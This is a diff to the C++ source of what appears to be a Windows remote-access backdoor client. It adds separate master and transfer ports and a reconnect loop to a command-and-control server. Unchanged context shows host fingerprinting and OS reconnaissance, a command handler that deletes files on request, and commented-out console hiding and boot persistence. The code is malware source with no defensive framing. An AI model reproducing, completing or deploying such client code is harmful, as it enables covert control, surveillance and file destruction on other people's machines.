@@ -4,7 +4,8 @@
 #define WIN32_LEAN_AND_MEAN
 #endif
 
-#define PORT 1337
+#define MASTER_PORT 1337
+#define TRANSFER_PORT 1338
 
 #include <winsock2.h>
 #include <ws2tcpip.h>
@@ -121,6 +122,7 @@ void handle(char *buff, BOOL *listen, BOOL *loop) {
     utils::startup((char*)path.c_str());
     *listen = FALSE;
     *loop = FALSE;
+
   } else if (cmd == "rm") {
     printf("removing %", args.c_str());
     remove(args.c_str());
@@ -128,13 +130,11 @@ void handle(char *buff, BOOL *listen, BOOL *loop) {
 }
 
 int main() {
-  printf("\nconnecting to %s:%d\n", ADDRESS, PORT);
+  printf("\nSet ,connection to master server in %s:%d\n", HOST, MASTER_PORT);
   // FreeConsole();
   G_UID = fingerprint::getUID();
-
   info = fingerprint::getOSInfo();
   fingerprint::reconOS(ID, &info);
-
   GetModuleFileName(NULL, exePath, MAX_PATH);
   // addToBoot(exePath);
 
@@ -155,7 +155,7 @@ int main() {
 
   while (run) {
     net::createSocket(&sock);
-    if (net::connect(&sock) == 0) {
+    if (net::connection(&sock, HOST, MASTER_PORT) == 0) {
 
       net::listen(&sock, &run, &handle);
     }
@@ -163,12 +163,6 @@ int main() {
     if (run) Sleep(5000);
   }
   net::close();
-  
-
-
-  // fingerprint::test();
-  // fs::test();
-  // net::test();
 
   return 0;
 }
